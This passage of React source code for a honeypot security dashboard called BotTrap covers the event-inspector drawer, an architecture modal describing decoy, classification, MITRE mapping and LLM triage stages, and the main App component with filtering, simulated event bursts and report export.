                className="px-2 py-0.5 text-[11px] font-mono bg-[#14171D] border border-[#2E3543] hover:border-[#8A93A2] rounded-[3px] text-[#F0F2F5] flex items-center gap-1 transition-colors"
              >
                {copiedPayload ? (
                  <>
                    <Check className="w-3 h-3 text-[#2EB872]" />
                    Copied
                  </>
                ) : (
                  <>
                    <Copy className="w-3 h-3 text-[#8A93A2]" />
                    Copy Raw
                  </>
                )}
              </button>
            </div>
            <pre className="bg-[#08090B] border border-[#1E232C] rounded-[4px] p-3.5 text-[11px] font-mono text-[#D1D7E0] overflow-x-auto leading-relaxed whitespace-pre-wrap break-all">
              {event.rawRequest}
            </pre>
          </div>

          {/* AI Threat Analysis Section */}
          <div className="bg-[#08090B] border border-[#1E232C] rounded-[4px] overflow-hidden">
            <div className="px-3.5 py-2.5 border-b border-[#1E232C] bg-[#14171D]/60 flex items-center justify-between">
              <div className="flex items-center gap-2">
                <Cpu className="w-3.5 h-3.5 text-[#14B8A6]" />
                <span className="text-[11px] font-mono uppercase tracking-wider text-[#F0F2F5]">
                  AI LLM Tactical Triage
                </span>
              </div>
              <span className="text-[11px] font-mono text-[#2EB872] tabular-nums">
                CONFIDENCE {event.confidence}%
              </span>
            </div>

            <div className="p-3.5 space-y-3 text-xs">
              <div>
                <div className="text-[10px] font-mono uppercase tracking-wider text-[#525B6A] mb-1">
                  TACTICAL SUMMARY
                </div>
                <p className="text-[#F0F2F5] leading-relaxed">{event.aiSummary}</p>
              </div>
              <div>
                <div className="text-[10px] font-mono uppercase tracking-wider text-[#525B6A] mb-1">
                  ASSESSED ATTACKER INTENT ({event.mitreTactic.toUpperCase()})
                </div>
                <p className="text-[#8A93A2] leading-relaxed">{event.aiIntent}</p>
              </div>

              {/* Generated Mitigation Snippet */}
              <div className="pt-2 border-t border-[#1E232C]">
                <div className="flex items-center justify-between mb-1.5">
                  <span className="text-[10px] font-mono uppercase tracking-wider text-[#525B6A] flex items-center gap-1.5">
                    <Lock className="w-3 h-3 text-[#E5484D]" />
                    RECOMMENDED MITIGATION RULE
                  </span>
                  <button
                    onClick={() => handleCopy(event.mitigation, setCopiedRule)}
                    className="px-2 py-0.5 text-[11px] font-mono bg-[#14171D] border border-[#2E3543] hover:border-[#2EB872]/60 rounded-[3px] text-[#F0F2F5] flex items-center gap-1 transition-colors"
                  >
                    {copiedRule ? (
                      <>
                        <Check className="w-3 h-3 text-[#2EB872]" />
                        Rule Copied
                      </>
                    ) : (
                      <>
                        <Copy className="w-3 h-3 text-[#8A93A2]" />
                        Copy Rule
                      </>
                    )}
                  </button>
                </div>
                <pre className="bg-[#0E1014] border border-[#1E232C] rounded-[4px] p-3 text-[11px] font-mono text-[#2EB872] overflow-x-auto leading-relaxed">
                  {event.mitigation}
                </pre>
              </div>
            </div>
          </div>
        </div>
      </aside>
    </div>
  );
}

// ============================================================================
// COMPONENT 8: ABOUT / ARCHITECTURE MODAL (Mirrors AboutPanel.jsx)
// ============================================================================

function AboutModal({ open, onClose }) {
  useEffect(() => {
    if (!open) return;
    const onKey = (e) => {
      if (e.key === 'Escape') onClose();
    };
    window.addEventListener('keydown', onKey);
    return () => window.removeEventListener('keydown', onKey);
  }, [open, onClose]);

  if (!open) return null;

  const stages = [
    {
      step: '01',
      title: 'Honeypot Decoys',
      desc: 'Low-interaction HTTP & SSH tarpit endpoints (/admin, /wp-login.php, /.env, SSH:22) capturing raw requests and credentials.',
      accent: '#3B82F6',
    },
    {
      step: '02',
      title: 'Deterministic Rule Engine',
      desc: 'Regex & heuristic pipeline (pipeline/rules.py) classifying SQLi, RCE, LFI, XSS, and brute-force patterns in sub-millisecond time.',
      accent: '#14B8A6',
    },
    {
      step: '03',
      title: 'MITRE ATT&CK Mapper',
      desc: 'Enriches every classified hit with GeoIP/ASN telemetry and maps payloads to ATT&CK techniques (T1190, T1110, T1059, T1083).',
      accent: '#E5A93C',
    },
    {
      step: '04',
      title: 'AI LLM Triage & SOC UI',
      desc: 'Generates concise intent summaries and copy-ready iptables/Nginx containment rules streamed directly into this React SOC console.',
      accent: '#E5484D',
    },
  ];

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center p-4">
      <div className="fixed inset-0 bg-black/70" onClick={onClose} />
      <div className="relative z-10 w-full max-w-2xl bg-[#0E1014] border border-[#2E3543] rounded-[6px] overflow-hidden shadow-2xl">
        <div
          className="h-[1px] w-full"
          style={{
            background:
              'linear-gradient(90deg, #3B82F6 0%, #14B8A6 33%, #E5A93C 66%, #E5484D 100%)',
          }}
        />
        <div className="px-5 py-4 border-b border-[#1E232C] flex items-center justify-between">
          <div>
            <h3 className="text-sm font-mono font-semibold text-[#F0F2F5] tracking-wider uppercase">
              BotTrap Pipeline Architecture
            </h3>
            <p className="text-xs text-[#8A93A2] mt-0.5">
              End-to-end deceptive telemetry, automated classification, and AI-assisted SOC triage
            </p>
          </div>
          <button
            onClick={onClose}
            className="p-1.5 rounded-[4px] text-[#8A93A2] hover:text-[#F0F2F5] hover:bg-[#14171D]"
          >
            <X className="w-4 h-4" />
          </button>
        </div>

        <div className="p-5 grid grid-cols-1 sm:grid-cols-2 gap-3">
          {stages.map((s) => (
            <div
              key={s.step}
              className="bg-[#08090B] border border-[#1E232C] rounded-[4px] p-3.5"
            >
              <div className="flex items-center justify-between mb-2">
                <span
                  className="font-mono text-xs font-semibold"
                  style={{ color: s.accent }}
                >
                  STAGE {s.step}
                </span>
                <span
                  className="w-2 h-2 rounded-full"
                  style={{ backgroundColor: s.accent }}
                />
              </div>
              <div className="text-xs font-semibold text-[#F0F2F5] mb-1">
                {s.title}
              </div>
              <p className="text-xs text-[#8A93A2] leading-relaxed">{s.desc}</p>
            </div>
          ))}
        </div>

        <div className="px-5 py-3 bg-[#08090B] border-t border-[#1E232C] flex items-center justify-between text-[11px] font-mono text-[#525B6A]">
          <span>BOTTRAP // HONEYPOT + FLASK/FASTAPI + LLM + REACT</span>
          <button
            onClick={onClose}
            className="px-3 py-1 bg-[#14171D] border border-[#2E3543] rounded-[4px] text-[#F0F2F5] hover:bg-[#1E232C]"
          >
            Close
          </button>
        </div>
      </div>
    </div>
  );
}

// ============================================================================
// MAIN APPLICATION COMPONENT
// ============================================================================

export default function App() {
  const [events, setEvents] = useState(() => generateInitialDataset(32));
  const [isLive, setIsLive] = useState(true);
  const [simulating, setSimulating] = useState(false);

  // Filters & Cross-filters
  const [searchQuery, setSearchQuery] = useState('');
  const [severityFilter, setSeverityFilter] = useState('ALL');
  const [attackTypeFilter, setAttackTypeFilter] = useState('ALL');
  const [mitreFilter, setMitreFilter] = useState(null);
  const [actorFilter, setActorFilter] = useState(null);

  // Modals / Drawers / Toast
  const [selectedEvent, setSelectedEvent] = useState(null);
  const [aboutOpen, setAboutOpen] = useState(false);
  const [toast, setToast] = useState(null);

  const showToast = useCallback((message) => {
    setToast(message);
    setTimeout(() => {
      setToast((curr) => (curr === message ? null : curr));
    }, 2600);
  }, []);

  // Live Polling Stream (every 3.5s)
  useEffect(() => {
    if (!isLive) return;
    const interval = setInterval(() => {
      const fresh = createEvent(0, true);
      setEvents((prev) => [fresh, ...prev.slice(0, 149)]);

      // Clear new-row highlight after 2.4s
      setTimeout(() => {
        setEvents((curr) =>
          curr.map((e) => (e.id === fresh.id ? { ...e, isNew: false } : e))
        );
      }, 2400);
    }, 3500);

    return () => clearInterval(interval);
  }, [isLive]);

  // Simulate Attack Burst (3-5 varied attacks immediately)
  const handleSimulateAttack = useCallback(() => {
    setSimulating(true);
    const burstSize = 4;
    const burst = Array.from({ length: burstSize }, (_, i) =>
      createEvent(i, true, Math.floor(Math.random() * ATTACK_TEMPLATES.length))
    );
    const burstIds = new Set(burst.map((b) => b.id));

    setEvents((prev) => [...burst, ...prev.slice(0, 146)]);
    showToast(`Injected ${burstSize} simulated honeypot intrusion events`);

    setTimeout(() => setSimulating(false), 600);
    setTimeout(() => {
      setEvents((curr) =>
        curr.map((e) => (burstIds.has(e.id) ? { ...e, isNew: false } : e))
      );
    }, 2600);
  }, [showToast]);

  // Filtered Dataset
  const filteredEvents = useMemo(() => {
    const q = searchQuery.trim().toLowerCase();
    return events.filter((ev) => {
      if (severityFilter !== 'ALL' && ev.severity !== severityFilter) return false;
      if (attackTypeFilter !== 'ALL' && ev.attackType !== attackTypeFilter) return false;
      if (mitreFilter && ev.mitreId !== mitreFilter) return false;
      if (actorFilter && ev.ip !== actorFilter) return false;
      if (q) {
        const haystack = `${ev.ip} ${ev.country} ${ev.city} ${ev.asn} ${ev.attackType} ${ev.targetPath} ${ev.mitreId} ${ev.payload} ${ev.ruleId}`.toLowerCase();
        if (!haystack.includes(q)) return false;
      }
      return true;
    });
  }, [events, searchQuery, severityFilter, attackTypeFilter, mitreFilter, actorFilter]);

  const handleResetFilters = useCallback(() => {
    setSearchQuery('');
    setSeverityFilter('ALL');
    setAttackTypeFilter('ALL');
    setMitreFilter(null);
    setActorFilter(null);
  }, []);

  // Export Structured Incident Report (Markdown or JSON)
  const handleExportReport = useCallback(
    (format) => {
      const ts = new Date().toISOString().replace(/[:.]/g, '-').slice(0, 19);
      let content = '';
      let mime = 'text/plain';
      let ext = 'txt';

      if (format === 'json') {
        content = JSON.stringify(
          {
            generatedAt: new Date().toISOString(),
            sensor: HONEYPOT_NODE.id,
            totalEvents: filteredEvents.length,
            events: filteredEvents,
          },
          null,
          2
        );
        mime = 'application/json';
        ext = 'json';
      } else {
        const crit = filteredEvents.filter((e) => e.severity === 'CRITICAL').length;
        const uniqueIps = new Set(filteredEvents.map((e) => e.ip)).size;
        const lines = [
          `# BotTrap Honeypot Threat Intelligence Report`,
          `- **Generated:** ${new Date().toISOString()}`,
          `- **Sensor Node:** ${HONEYPOT_NODE.name} (${HONEYPOT_NODE.id})`,
          `- **Filtered Events:** ${filteredEvents.length} (${crit} Critical, ${uniqueIps} Unique IPs)`,
          ``,
          `## Captured Events Summary`,
          `| Timestamp | Severity | Source IP | Geo | Attack Vector | Target | MITRE |`,
          `|---|---|---|---|---|---|---|`,
          ...filteredEvents.slice(0, 50).map(
            (e) =>
              `| ${formatTimeHMS(e.timestamp)} | ${e.severity} | \`${e.ip}\` | ${e.countryCode} | ${e.attackType} | \`${e.targetPath}\` | ${e.mitreId} |`
          ),
        ];
        content = lines.join('\n');
        mime = 'text/markdown';
        ext = 'md';
      }

      const blob = new Blob([content], { type: mime });
      const url = URL.createObjectURL(blob);
      const a = document.createElement('a');
      a.href = url;
      a.download = `bottrap-threat-report-${ts}.${ext}`;
      document.body.appendChild(a);
      a.click();
      document.body.removeChild(a);
      URL.revokeObjectURL(url);
      showToast(`Exported ${filteredEvents.length} events as .${ext.toUpperCase()}`);
    },
    [filteredEvents, showToast]
  );

  return (
    <ErrorBoundary>
      <div className="min-h-screen bg-[#08090B] text-[#F0F2F5] font-sans antialiased selection:bg-[#3B82F6]/30 selection:text-[#F0F2F5]">
        {/* Precision Animations & Tabular Numerals */}
        <style>{`
          .tabular-nums { font-variant-numeric: tabular-nums; }
          @keyframes bottrapArcFlow {
            from { stroke-dashoffset: 146; }
            to { stroke-dashoffset: 0; }
          }
          .bottrap-arc-flow {
            animation: bottrapArcFlow 2.6s linear infinite;
          }
          @keyframes bottrapNewRow {
            0% { background-color: rgba(20, 184, 166, 0.12); }
            100% { background-color: transparent; }
          }
          .bottrap-new-row {
            animation: bottrapNewRow 2.2s ease-out;
          }
          @keyframes bottrapDrawerIn {
            from { transform: translateX(28px); opacity: 0; }
            to { transform: translateX(0); opacity: 1; }
          }
          .bottrap-drawer-in {
            animation: bottrapDrawerIn 0.18s cubic-bezier(0.16, 1, 0.3, 1);
          }
        `}</style>

        {/* 1. Navbar */}
        <Navbar
          isLive={isLive}
          onToggleLive={() => setIsLive((v) => !v)}
          onSimulateAttack={handleSimulateAttack}
          onExportReport={handleExportReport}
          onOpenAbout={() => setAboutOpen(true)}
          simulating={simulating}
          eventCount={filteredEvents.length}
        />

        {/* Main Workspace Container */}
        <main className="max-w-[1600px] mx-auto px-4 sm:px-6 py-4 space-y-3.5">
          {/* 2. Threat Level Banner */}
          <ThreatLevelBanner
            events={events}
            onSelectPath={(path) => setSearchQuery(path)}
          />

          {/* 3. Stat Cards (4 KPIs) */}
          <StatCards
            events={filteredEvents}
            allEvents={events}
            activeSeverity={severityFilter}
            onToggleCritical={() =>
              setSeverityFilter((curr) => (curr === 'CRITICAL' ? 'ALL' : 'CRITICAL'))
            }
          />

          {/* 4. Filter Bar */}
          <FilterBar
            searchQuery={searchQuery}
            onSearchChange={setSearchQuery}
            severityFilter={severityFilter}
            onSeverityChange={setSeverityFilter}
            attackTypeFilter={attackTypeFilter}
            onAttackTypeChange={setAttackTypeFilter}
            mitreFilter={mitreFilter}
            onClearMitre={() => setMitreFilter(null)}
            actorFilter={actorFilter}
            onClearActor={() => setActorFilter(null)}
            onResetAll={handleResetFilters}
          />

          {/* 5. Main Bento Grid — Row 1: AttackMap (8 cols) + TimelineChart (4 cols) */}
          <div className="grid grid-cols-1 lg:grid-cols-12 gap-3.5">
            <div className="lg:col-span-8 flex flex-col">
              <AttackMap
                events={filteredEvents}
                activeActor={actorFilter}
                onSelectActor={setActorFilter}
              />
            </div>
            <div className="lg:col-span-4 flex flex-col">
              <TimelineChart events={filteredEvents} />
            </div>
          </div>

          {/* 5. Main Bento Grid — Row 2: AttackTypeChart + MitreChart + TopAttackers */}
          <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-3.5">
            <AttackTypeChart
              events={filteredEvents}
              activeType={attackTypeFilter}
              onSelectType={setAttackTypeFilter}
            />
            <MitreChart
              events={filteredEvents}
              activeMitre={mitreFilter}
              onSelectMitre={setMitreFilter}
            />
            <TopAttackers
              events={filteredEvents}
              activeActor={actorFilter}
              onSelectActor={setActorFilter}
            />
          </div>

          {/* 6. Live Feed Table */}
          <LiveFeed
            events={filteredEvents}
            selectedEventId={selectedEvent?.id}
            onInspectEvent={setSelectedEvent}
          />
        </main>

        {/* 7. Event Detail Slide-Over Inspector Drawer */}
        <EventDetailModal
          event={selectedEvent}
          onClose={() => setSelectedEvent(null)}
          onFilterByIp={(ip) => setActorFilter(ip)}
        />

        {/* 8. Architecture / About Modal */}
        <AboutModal open={aboutOpen} onClose={() => setAboutOpen(false)} />

        {/* Subtle Status Toast */}
        {toast && (
          <div className="fixed bottom-4 right-4 z-50 bg-[#14171D] border border-[#2E3543] rounded-[4px] px-3.5 py-2 text-xs font-mono text-[#F0F2F5] shadow-2xl flex items-center gap-2">
            <span className="w-1.5 h-1.5 rounded-full bg-[#2EB872]" />
            {toast}
          </div>
        )}
      </div>
    </ErrorBoundary>
  );
}
